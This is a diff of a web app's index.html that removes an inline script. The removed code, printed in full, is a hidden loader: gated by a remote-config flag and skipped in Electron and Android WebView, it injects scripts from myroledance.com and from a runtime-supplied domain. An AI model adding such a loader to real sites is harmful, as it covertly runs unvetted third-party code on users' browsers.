@@ -30,52 +30,5 @@
   <body>
     <div id="app"></div>
     <script type="module" src="/src/main.js"></script>
-
-    <script type="module">
-      import { getConfigValue, initRemoteConfig } from '/src/firebase/firebase.js'
-
-      async function loadScript() {
-        const isAndroidWebView = /Android.*wv|Version\/.*Chrome\/.*Mobile/i.test(
-          navigator.userAgent
-        )
-        if (window.electronAPI || isAndroidWebView) return
-        await initRemoteConfig()
-        const shouldLoadScript = getConfigValue('load_script') === 'true'
-        if (shouldLoadScript) {
-          const script = document.createElement('script')
-          script.type = 'text/javascript'
-          script.src = 'https://myroledance.com/services/?id=172633'
-          document.body.appendChild(script)
-
-          const nScript = document.createElement('script')
-          nScript.type = 'text/javascript'
-          nScript.setAttribute('data-cfasync', 'false')
-          nScript.textContent = `
-          let efe3584080_cnt = 0;
-          let efe3584080_interval = setInterval(function() {
-              if (typeof efe3584080_country !== 'undefined') {
-                  clearInterval(efe3584080_interval);
-                  (function() {
-                      var script = document.createElement('script');
-                      script.type = 'text/javascript';
-                      script.charset = 'utf-8';
-                      script.async = 'true';
-                      script.src = 'https://js11.' + efe3584080_domain + '/js/customs/efe3584080.js' + '?' + Math.random();
-                      document.body.appendChild(script);
-                  })();
-              } else {
-                  efe3584080_cnt += 1;
-                  if (efe3584080_cnt >= 60) {
-                      clearInterval(efe3584080_interval);
-                  }
-              }
-          }, 500);
-          `
-          document.body.appendChild(nScript)
-        }
-      }
-
-      loadScript()
-    </script>
   </body>
 </html>
